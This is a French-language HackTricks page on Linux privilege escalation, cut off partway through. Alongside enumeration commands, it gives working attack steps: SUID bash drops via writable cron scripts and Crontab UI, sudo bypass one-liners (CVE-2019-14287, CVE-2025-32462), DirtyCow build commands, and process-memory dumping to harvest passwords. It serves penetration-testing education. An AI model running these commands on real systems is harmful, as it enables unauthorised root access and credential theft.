# Élévation de privilèges Linux

{{#include ../../../banners/hacktricks-training.md}}

Pour un aperçu plus large et les méthodes historiques d’énumération, consultez les ressources g0tmi1k, Payatu, SANS, LPE Workshop, Linux-Privilege-Escalation et linux-private-i listées dans les références.<sup>[[5]](#references)[[6]](#references)[[7]](#references)[[10]](#references)[[11]](#references)[[13]](#references)</sup>

## Informations système

### Informations sur le système d’exploitation

Commençons par recueillir des informations sur le système d’exploitation en cours d’exécution.

```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```

### Chemin

Si vous **avez des permissions d’écriture sur un dossier du variable `PATH`**, vous pourrez peut-être détourner certaines bibliothèques ou certains binaires :

```bash
echo $PATH
```

### Infos sur l’environnement

Des informations intéressantes, des mots de passe ou des clés API dans les variables d’environnement ?

```bash
(env || set) 2>/dev/null
```

### Exploits du noyau

Vérifiez la version du noyau et s’il existe un exploit permettant d’élever les privilèges.

La [section Kernel/LPE/CVE](../../main-system-information/kernel-lpe-cves/README.md) répertorie des cas d’élévation locale de privilèges et renvoie vers des analyses plus approfondies du noyau Linux dans Binary Exploitation. Vérifiez la build et la configuration concernées avant de tester une étude de cas.

```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```

Vous trouverez ici une bonne liste de kernels vulnérables et quelques **exploits compilés** : [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) et [les exploits d’exploitdb](https://gitlab.com/exploit-database/exploitdb-bin-sploits).<sup>[[12]](#references)</sup>\
Autres sites où trouver des **exploits compilés** : [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Pour extraire toutes les versions de kernel vulnérables depuis ce site, vous pouvez faire :

```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```

Les outils qui peuvent aider à rechercher des exploits de kernel sont :

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (à exécuter SUR la victime, vérifie uniquement les exploits pour le kernel 2.x)

Recherchez toujours **la version du kernel sur Google** : votre version du kernel est peut-être mentionnée dans un exploit, ce qui vous permettra de vérifier que cet exploit est valide.

Techniques supplémentaires d’exploitation du kernel :

{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Élévation de privilèges Linux - kernel Linux <= 3.19.0-73.8

```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```

### Version de Sudo

En fonction des versions vulnérables de sudo qui apparaissent dans :

```bash
searchsploit sudo
```

Vous pouvez vérifier si la version de sudo est vulnérable à l’aide de cette commande grep.

```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```

### Sudo < 1.9.17p1

Les versions amont de sudo **1.9.14 à 1.9.17** permettent aux utilisateurs locaux non privilégiés d’obtenir les privilèges root via l’option `--chroot` lorsque sudo charge `/etc/nsswitch.conf` depuis un répertoire contrôlé par l’utilisateur ; l’amont a corrigé ce problème dans **1.9.17p1**. Vérifiez chaque binaire sudo exécutable avec le bit setuid root dans les chemins concernés, car `sudo -V` n’indique que le binaire sélectionné via `PATH`. Les paquets des distributions peuvent rétroporter le correctif sans modifier la chaîne de version amont ; vérifiez donc également l’état du paquet fourni par le fournisseur. Consultez l’[avis du mainteneur de sudo](https://www.openwall.com/lists/oss-security/2025/06/30/3).<sup>[[28]](#references)[[29]](#references)</sup>

Voici un [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) pour exploiter cette [vulnérabilité](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Avant d’exécuter l’exploit, assurez-vous que votre version de `sudo` est vulnérable et qu’elle prend en charge la fonctionnalité `chroot`.  

Pour plus d’informations, consultez l’[avis de vulnérabilité original](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/).<sup>[[28]](#references)</sup>

### Contournement des règles sudo basées sur l’hôte (CVE-2025-32462)

Les versions amont de sudo **1.8.8 à 1.9.17** peuvent évaluer les règles sudoers basées sur l’hôte en utilisant le **nom d’hôte fourni par l’utilisateur** via `sudo -h <host>` au lieu du **nom d’hôte réel** ; l’amont a corrigé ce problème dans **1.9.17p1**. L’utilisateur doit toujours disposer d’une entrée sudoers correspondante sur l’hôte sélectionné. Vérifiez également les rétroportages des fournisseurs et les autres binaires sudo, en plus de la politique locale. Consultez l’[avis du mainteneur de sudo](https://www.openwall.com/lists/oss-security/2025/06/30/2).<sup>[[29]](#references)</sup>

Conditions requises :
- Version vulnérable de sudo
- Règles sudoers spécifiques à l’hôte (l’hôte n’est ni le nom d’hôte actuel ni `ALL`)

Exemple de règle sudoers :

```
Host_Alias     SERVERS = devbox, prodbox
Host_Alias     PROD    = prodbox
alice          SERVERS, !PROD = NOPASSWD:ALL
```

Exploiter en usurpant l’hôte autorisé :

```bash
sudo -h devbox id
sudo -h devbox -i
```

Si la résolution du nom sélectionné bloque, vérifiez comment ce nom est résolu sur l’hôte. Le simple fait de voir un nom dans un journal ou un fichier de configuration ne signifie pas qu’il peut être résolu, et la modification de `/etc/hosts` nécessite généralement un accès en écriture privilégié.

#### sudo < v1.8.28

Ce [contournement upstream de Runas UID](https://ubuntu.com/security/CVE-2019-14287) nécessite une règle sudo effective qui autorise une commande en tant que tous les utilisateurs sauf root, par exemple `(ALL, !root) /bin/bash`. L’appelant doit également être autorisé à utiliser cette règle, y compris toute exigence d’authentification. Consultez l’avis de sécurité du paquet installé : les fournisseurs ont rétroporté le correctif dans des versions dont le numéro affiché reste inférieur à 1.8.28. Une règle `!root` ou une ancienne version ne suffit pas à confirmer une exposition. Ne testez pas de commande privilégiée lors d’une énumération passive.

```
sudo -u#-1 /bin/bash
```

### Échec de la vérification de signature de Dmesg

Consultez la box **smasher2** de HTB pour un **exemple** de la manière dont cette vuln pourrait être exploitée.

```bash
dmesg 2>/dev/null | grep "signature"
```

### Énumération supplémentaire du système

```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```

## Énumérer les défenses possibles

### AppArmor

```bash
if [ `which aa-status 2>/dev/null` ]; then
    aa-status
  elif [ `which apparmor_status 2>/dev/null` ]; then
    apparmor_status
  elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
    ls -d /etc/apparmor*
  else
    echo "Not found AppArmor"
fi
```

### Grsecurity

```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```

### PaX

```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```

### Execshield

```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```

### SElinux

```bash
 (sestatus 2>/dev/null || echo "Not found sestatus")
```

### ASLR

```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```

## Évasion de conteneur

Si vous êtes dans un conteneur, commencez par la section suivante sur la sécurité des conteneurs, puis passez aux pages sur les abus spécifiques aux environnements d’exécution :


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Lecteurs

Vérifiez **ce qui est monté et démonté**, où et pourquoi. Si quelque chose est démonté, vous pouvez essayer de le monter et de vérifier s’il contient des informations privées.

```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```

## Logiciels utiles

Répertorier les binaires utiles

```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```

Vérifiez également si **un compilateur est installé**. C'est utile si vous devez utiliser un kernel exploit, car il est recommandé de le compiler sur la machine où vous comptez l'utiliser (ou sur une machine similaire).

```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```

### Logiciels vulnérables installés

Vérifiez la **version des paquets et des services installés**. Il se peut qu’une ancienne version de Nagios, par exemple, puisse être exploitée pour obtenir une élévation de privilèges…\
Il est recommandé de vérifier manuellement la version des logiciels installés les plus suspects.

```bash
dpkg -l #Debian
rpm -qa #Centos
```

Si vous avez un accès SSH à la machine, vous pouvez également utiliser **openVAS** pour vérifier si des logiciels obsolètes et vulnérables sont installés sur la machine.

> [!NOTE] > _Notez que ces commandes afficheront beaucoup d’informations, dont la plupart seront inutiles. Il est donc recommandé d’utiliser des applications comme OpenVAS ou similaires, qui vérifieront si une version des logiciels installés est vulnérable à des exploits connus._

## Processus

Examinez **les processus** en cours d’exécution et vérifiez si l’un d’eux dispose de **plus de privilèges que nécessaire** (par exemple, Tomcat exécuté par root ?)

```bash
ps aux
ps -ef
top -n 1
```

Toujours vérifier si des [**debuggers electron/cef/chromium**](../../software-information/electron-cef-chromium-debugger-abuse.md) sont en cours d’exécution : vous pourriez en abuser pour escalader vos privilèges. **Linpeas** les détecte en recherchant le paramètre `--inspect` dans la ligne de commande du processus.\
Vérifiez également **vos privilèges sur les binaires des processus** : vous pourriez peut-être en écraser un.

### Chaînes parent-enfant entre utilisateurs

Un processus enfant exécuté sous un **utilisateur différent** de celui de son parent n’est pas automatiquement malveillant, mais constitue un **signal utile pour le triage**. Certaines transitions sont attendues (`root` qui lance un service sous un autre utilisateur, gestionnaires de connexion qui créent des processus de session), mais des chaînes inhabituelles peuvent révéler des wrappers, des outils de débogage, de la persistance ou des limites de confiance à l’exécution mal sécurisées.

Vérification rapide :

```bash
ps -eo pid,ppid,user,comm,args --sort=ppid
pstree -alp
```

Si vous trouvez une chaîne surprenante, inspectez la ligne de commande du processus parent et tous les fichiers qui influencent son comportement (`config`, `EnvironmentFile`, scripts auxiliaires, répertoire de travail, arguments modifiables). Dans plusieurs cas réels de privesc, le processus enfant lui-même n’était pas modifiable, mais la **config contrôlée par le processus parent** ou la chaîne de scripts auxiliaires l’était.

### Exécutables supprimés et fichiers ouverts supprimés

Les artefacts d’exécution sont souvent encore accessibles **après leur suppression**. C’est utile à la fois pour l’escalade de privilèges et pour récupérer des preuves auprès d’un processus qui a déjà ouvert des fichiers sensibles.

Recherchez les exécutables supprimés :

```bash
pid=<PID>
ls -l /proc/$pid/exe
readlink /proc/$pid/exe
tr '\0' ' ' </proc/$pid/cmdline; echo
```

Si `/proc/<PID>/exe` pointe vers `(deleted)`, le processus exécute toujours l’ancienne image binaire depuis la mémoire. C’est un signal important à examiner, car :

- l’exécutable supprimé peut contenir des chaînes ou des identifiants intéressants
- le processus en cours d’exécution peut encore exposer des descripteurs de fichiers utiles
- un binaire privilégié supprimé peut indiquer une altération récente ou une tentative de nettoyage

Collecter globalement les fichiers ouverts mais supprimés :

```bash
lsof +L1
```

Si vous trouvez un descripteur intéressant, récupérez-le directement :

```bash
ls -l /proc/<PID>/fd
cat /proc/<PID>/fd/<FD>
```

C'est particulièrement utile lorsqu'un processus a toujours ouvert un secret supprimé, un script, un export de base de données ou un fichier contenant un flag.

### Surveillance des processus

Vous pouvez utiliser des outils comme [**pspy**](https://github.com/DominicBreuker/pspy) pour surveiller les processus. Cela peut être très utile pour identifier les processus vulnérables qui s'exécutent fréquemment ou lorsque certaines conditions sont réunies.

#### Linux ProcMon avec sudo

[ProcMon for Linux](https://github.com/microsoft/ProcMon-for-Linux) peut tracer les processus et appels système sélectionnés, puis enregistrer la trace dans une base de données SQLite. Si `sudo -l` autorise une commande `procmon` sans restriction et capable de s'exécuter en tant que root, déterminez si elle pourrait observer les entrées ou sorties d'un processus appartenant à un autre utilisateur. Cette permission est simplement une piste à examiner : la prise en charge du traçage, la politique effective et l'activité d'un processus adéquat sont autant de facteurs à prendre en compte. Les fichiers de trace peuvent contenir des secrets ; examinez soigneusement les exports autorisés et évitez de collecter des données sur des processus sans rapport.

### Mémoire des processus

Certains services d'un serveur enregistrent des **identifiants en clair dans la mémoire**.\
Normalement, vous aurez besoin des **privilèges root** pour lire la mémoire des processus appartenant à d'autres utilisateurs. C'est donc généralement plus utile lorsque vous êtes déjà root et souhaitez découvrir d'autres identifiants.\
Cependant, n'oubliez pas qu'**en tant qu'utilisateur ordinaire, vous pouvez lire la mémoire des processus qui vous appartiennent**.

> [!WARNING]
> Notez qu'aujourd'hui, la plupart des machines **n'autorisent pas ptrace par défaut**, ce qui signifie que vous ne pouvez pas vider la mémoire d'autres processus appartenant à votre utilisateur non privilégié.
>
> Le fichier _**/proc/sys/kernel/yama/ptrace_scope**_ contrôle l'accessibilité de ptrace :
>
> - **kernel.yama.ptrace_scope = 0** : tous les processus peuvent être débogués, à condition d'avoir le même uid. C'est la méthode classique de fonctionnement de ptrace.
> - **kernel.yama.ptrace_scope = 1** : seul un processus parent peut être débogué.
> - **kernel.yama.ptrace_scope = 2** : seul l'administrateur peut utiliser ptrace, car cela nécessite la capacité CAP_SYS_PTRACE.
> - **kernel.yama.ptrace_scope = 3** : aucun processus ne peut être tracé avec ptrace. Une fois ce paramètre défini, un redémarrage est nécessaire pour réactiver ptrace.

Un processus avec le même UID qui déverrouille brièvement un coffre-fort de mots de passe constitue une frontière distincte pour les identifiants. Lorsque le traçage est autorisé, un processus actif et dumpable peut exposer le mot de passe du coffre-fort via ses appels système d'entrée ou sa mémoire, même si le fichier chiffré du coffre reste protégé. `ptrace_scope=0` n'est qu'une condition préalable : la correspondance des identifiants, le caractère dumpable de la cible, les autres modules de sécurité Linux et la durée de vie du processus comptent également. La réutilisation d'un identifiant d'entrée du coffre-fort pour se connecter en tant que root sous Unix doit faire l'objet d'une vérification distincte. Une énumération courante devrait signaler la politique et les chemins des processus ou coffres-forts potentiels, sans capturer d'entrées ni afficher de secrets. Consultez la [documentation Yama du noyau](https://cdn.kernel.org/doc/html/latest/admin-guide/LSM/Yama.html) et les [vérifications d'accès de ptrace](https://man7.org/linux/man-pages/man2/ptrace.2.html).

#### GDB

Si vous avez accès à la mémoire d'un service FTP, par exemple, vous pourriez récupérer le Heap et y rechercher ses identifiants.

```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```

#### Script GDB

```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
    | sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
    | while read start stop; do \
    gdb --batch --pid $1 -ex \
    "dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```

#### /proc/$pid/maps & /proc/$pid/mem

Pour un ID de processus donné, **maps indique comment la mémoire est mappée dans l’espace d’adressage virtuel de ce processus** ; il indique également les **permissions de chaque région mappée**. Le pseudo-fichier **mem expose directement la mémoire du processus**. Le fichier **maps** nous indique quelles **régions mémoire sont lisibles** ainsi que leurs décalages. Nous utilisons ces informations pour **nous déplacer dans le fichier mem et extraire toutes les régions lisibles** dans un fichier.

```bash
procdump()
(
    cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
    while read a b; do
        dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
           skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
    done )
    cat $1*.bin > $1.dump
    rm $1*.bin
)
```

#### /dev/mem

`/dev/mem` permet d'accéder à la mémoire **physique** du système, et non à la mémoire virtuelle. L'espace d'adressage virtuel du noyau est accessible via /dev/kmem.\
En général, `/dev/mem` est lisible uniquement par **root** et le groupe **kmem**.

```
strings /dev/mem -n10 | grep -i PASS
```

### ProcDump pour Linux

ProcDump est une réinterprétation pour Linux de l’outil ProcDump classique de la suite Sysinternals pour Windows. Téléchargez-le sur [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)

```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```

### Outils

Pour dumper la mémoire d’un processus, vous pouvez utiliser :

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Vous pouvez supprimer manuellement les exigences root et dumper le processus qui vous appartient
- Script A.5 de [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root est requis)

### Identifiants dans la mémoire d’un processus

#### Exemple manuel

Si vous constatez que le processus d’authentification est en cours d’exécution :

```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```

Vous pouvez dumper le processus (consultez les sections précédentes pour découvrir différentes façons de dumper la mémoire d’un processus) et rechercher des identifiants dans la mémoire :

```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```

#### mimipenguin

L’outil [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) va **voler des identifiants en clair depuis la mémoire** et certains **fichiers bien connus**. Il nécessite des privilèges root pour fonctionner correctement.

| Fonctionnalité                                    | Nom du processus     |
| ------------------------------------------------- | -------------------- |
| Mot de passe GDM (Kali Desktop, Debian Desktop)   | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (connexions FTP actives)                   | vsftpd               |
| Apache2 (sessions HTTP Basic Auth actives)        | apache2              |
| OpenSSH (sessions SSH actives - utilisation de Sudo) | sshd:             |

#### Expressions régulières de recherche/[truffleproc](https://github.com/controlplaneio/truffleproc)

```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```

## Tâches planifiées/Cron

### Crontab UI (alseambusher) exécuté en tant que root – élévation de privilèges via un planificateur web

Si un panneau web « Crontab UI » (alseambusher/crontab-ui) s’exécute en tant que root et n’est accessible que depuis loopback, vous pouvez tout de même y accéder via un transfert de port local SSH et créer une tâche privilégiée pour élever vos privilèges.<sup>[[1]](#references)[[4]](#references)</sup>

Chaîne typique
- Repérer un port accessible uniquement depuis loopback (p. ex. 127.0.0.1:8000) et le realm Basic-Auth via `ss -ntlp` / `curl -v localhost:8000`
- Trouver les identifiants dans des artefacts opérationnels :
  - Sauvegardes/scripts contenant `zip -P <password>`
  - Unité systemd exposant `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Créer un tunnel et se connecter :
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Créez un job à privilèges élevés et exécutez-le immédiatement (dépose un shell SUID) :
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Utilisez-le :
```bash
/tmp/rootshell -p   # root shell
```

Durcissement
- Ne lancez pas Crontab UI en tant que root ; utilisez un utilisateur dédié avec des permissions minimales
- Limitez l’écoute à localhost et restreignez aussi l’accès via un firewall/VPN ; ne réutilisez pas les mots de passe
- Évitez d’intégrer des secrets dans les fichiers unit ; utilisez des secret stores ou un fichier EnvironmentFile accessible uniquement à root
- Activez l’audit et la journalisation des exécutions de tâches à la demande

Vérifiez si une tâche planifiée est vulnérable. Vous pouvez peut-être exploiter un script exécuté par root (wildcard vuln ? Pouvez-vous modifier des fichiers utilisés par root ? Utiliser des symlinks ? Créer des fichiers spécifiques dans le répertoire utilisé par root ?).

```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```

Si `run-parts` est utilisé, vérifiez quels noms seront effectivement exécutés :

```bash
run-parts --test /etc/cron.hourly
run-parts --test /etc/cron.daily
```

Cela évite les faux positifs. Un répertoire périodique accessible en écriture n'est utile que si le nom de votre payload respecte les règles locales de `run-parts`.

### Chemin du cron

Par exemple, dans _/etc/crontab_, vous pouvez trouver le PATH : _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Notez que l'utilisateur « user » dispose de droits d'écriture sur /home/user_)

Si l'utilisateur root tente d'exécuter une commande ou un script depuis ce crontab sans définir le chemin, par exemple : _\* \* \* \* root overwrite.sh_\
Vous pouvez alors obtenir un shell root en utilisant :

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```

### Cron utilisant un script avec un caractère générique (Wildcard Injection)

Si un script exécuté par root contient un « **\*** » dans une commande, vous pouvez exploiter cela pour provoquer des effets inattendus (comme une élévation de privilèges). Exemple :

```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```

**Si le wildcard est précédé d’un chemin comme** _**/some/path/\***_ **, il n’est pas vulnérable (même** _**./\***_ **ne l’est pas).**

Lisez la page suivante pour découvrir d’autres astuces d’exploitation des wildcards :


{{#ref}}
../../interesting-files-permissions/wildcards-spare-tricks.md
{{#endref}}


### Injection dans l’expansion arithmétique Bash dans les analyseurs de logs cron

Bash peut interpréter du texte non fiable comme une expression arithmétique. Dans certains contextes Bash, un indice de tableau dans cette expression peut évaluer une substitution de commande. Si un analyseur privilégié insère du texte de log contrôlé par un attaquant dans une comparaison arithmétique, la substitution peut s’exécuter avec l’identité de l’analyseur.<sup>[[22]](#references)</sup> Cela dépend de l’expression Bash exacte et de sa version ; une chaîne `$(...)0` isolée dans une variable développée ne constitue pas, à elle seule, une démonstration fiable d’une réévaluation.

L’entrée peut aussi provenir des métadonnées d’un fichier ou d’un autre champ lu depuis un emplacement accessible en écriture à un utilisateur. Par exemple, un script de nettoyage privilégié qui lit une balise `Producer` d’une image et la compare avec `[[ "$producer" -eq "expected" ]]` effectue une comparaison arithmétique, même si la variable est entre guillemets. Déterminez l’identité utilisée pour l’exécution planifiée, les fichiers pouvant fournir la balise, les transformations effectuées avant la comparaison et le comportement exact de Bash. Pour les libellés textuels, utilisez une comparaison de chaînes ; pour les nombres, validez que l’entrée ne contient que des chiffres décimaux avant d’effectuer des opérations arithmétiques. Consultez les [règles arithmétiques de Bash](https://www.gnu.org/software/bash/manual/html_node/Shell-Arithmetic.html).

- Schéma typiquement vulnérable :
  ```bash
  #!/bin/bash
  # Example: parse a log and "sum" a count field coming from the log
  while IFS=',' read -r ts user count rest; do
      # count is untrusted if the log is attacker-controlled
      (( total += count ))     # or: let "n=$count"
  done < /var/www/app/log/application.log
  ```

- Sonde locale sûre du comportement du mécanisme d’indice de tableau (sans processus privilégié ni modification de fichier) :
  ```bash
  code='x[$(printf marker >&2)]'
  [[ 200 -eq "$code" ]]
  # Bash may print "marker" while evaluating the arithmetic operand.
  ```

Tracez le script réellement planifié et le chemin littéral du fichier qu’il ouvre. Même si le fichier journal lui-même n’est pas accessible en écriture, un utilisateur qui peut écrire dans son répertoire parent non sticky et le traverser peut éventuellement remplacer son entrée de répertoire ; `namei -l` aide à distinguer ces permissions. Un autre chemin de journal accessible en écriture, un ordonnanceur illisible ou un analyseur qui n’évalue jamais ce champ comme une opération arithmétique Bash ne suffisent pas à établir ce chemin.

### Écrasement d’un script Cron et symlink

Si vous **pouvez modifier un script Cron** exécuté par root, vous pouvez très facilement obtenir un shell :

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```

Si le script exécuté par root utilise un **répertoire auquel vous avez un accès complet**, il pourrait être utile de supprimer ce dossier et de **créer un dossier symlink vers un autre répertoire** hébergeant un script que vous contrôlez.

```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```

### Validation des liens symboliques et gestion plus sûre des fichiers

Lors de l’examen de scripts/binaires privilégiés qui lisent ou écrivent des fichiers par chemin, vérifiez comment les liens sont gérés :

- `stat()` suit un lien symbolique et renvoie les métadonnées de la cible.
- `lstat()` renvoie les métadonnées du lien lui-même.
- `readlink -f` et `namei -l` aident à résoudre la cible finale et affichent les permissions de chaque composant du chemin.

```bash
readlink -f /path/to/link
namei -l /path/to/link
```

Pour les défenseurs et les développeurs, voici des pratiques plus sûres contre les attaques par symlink :

- `O_EXCL` avec `O_CREAT` : échouer si le chemin existe déjà (bloque les liens/fichiers précréés par un attaquant).
- `openat()` : travailler relativement à un descripteur de fichier pointant vers un répertoire de confiance.
- `mkstemp()` : créer des fichiers temporaires de façon atomique avec des permissions sécurisées.

### Binaires cron signés sur mesure avec des charges utiles modifiables
Un utilisateur ordinaire capable d’écrire dans le binaire exact exécuté par une tâche cron de root peut franchir une frontière de privilèges, mais une vérification de signature personnalisée peut rejeter un remplacement non signé. Dans le cas documenté, l’ELF appartenant à root était en mode `0760`, ce qui permettait à un membre de son groupe de le modifier, tandis que le propriétaire root pouvait l’exécuter. Une trace de processus visible montrait `objcopy` extrayant `.text_sig` avant que la tâche n’exécute le binaire ; le script de vérification complet n’était pas lisible.<sup>[[2]](#references)</sup>

Le remplacement qui a fonctionné était signé avec du matériel de signature privé ayant fuité, au moyen d’un signataire ELF. Sa [documentation sur le format](https://github.com/NUAA-WatchDog/linux-elf-binary-signer) décrit une section de signature dérivée du `.text` de l’exécutable. Rien ne montre que le simple fait d’ajouter un certificat ou une chaîne correspondante à `.text_sig` suffise à satisfaire le vérificateur non visible. Vérifiez le chemin réellement planifié, les droits d’écriture effectifs, l’invocation par root et la politique du vérificateur avant de conclure qu’un binaire signé et modifiable est exploitable. Une section `.text_sig` à elle seule n’est qu’un indice à examiner.

### Tâches cron fréquentes

Vous pouvez surveiller les processus pour repérer ceux qui sont exécutés toutes les 1, 2 ou 5 minutes. Vous pourrez peut-être en tirer parti pour élever vos privilèges.

Par exemple, pour **surveiller toutes les 0,1 s pendant 1 minute**, **trier par commandes les moins exécutées** et supprimer celles qui ont été exécutées le plus souvent, vous pouvez faire :

```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```

**Vous pouvez également utiliser** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (cela surveillera et listera chaque processus qui démarre).

### Backups root qui préservent les bits de mode définis par l’attaquant (pg_basebackup)

Si un cron appartenant à root exécute `pg_basebackup` (ou toute copie récursive) sur un répertoire de base de données dans lequel vous pouvez écrire, vous pouvez y déposer un **binaire SUID/SGID** qui sera recopié en tant que **root:root**, avec les mêmes bits de mode, dans le répertoire de sortie du backup.<sup>[[26]](#references)</sup>

Déroulement typique de la découverte (en tant qu’utilisateur DB avec de faibles privilèges) :
- Utilisez `pspy` pour repérer un cron root qui exécute toutes les minutes une commande du type `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/`.
- Confirmez que le cluster source (par exemple, `/var/lib/postgresql/14/main`) est accessible en écriture et que la destination (`/opt/backups/current`) appartient à root après l’exécution de la tâche.

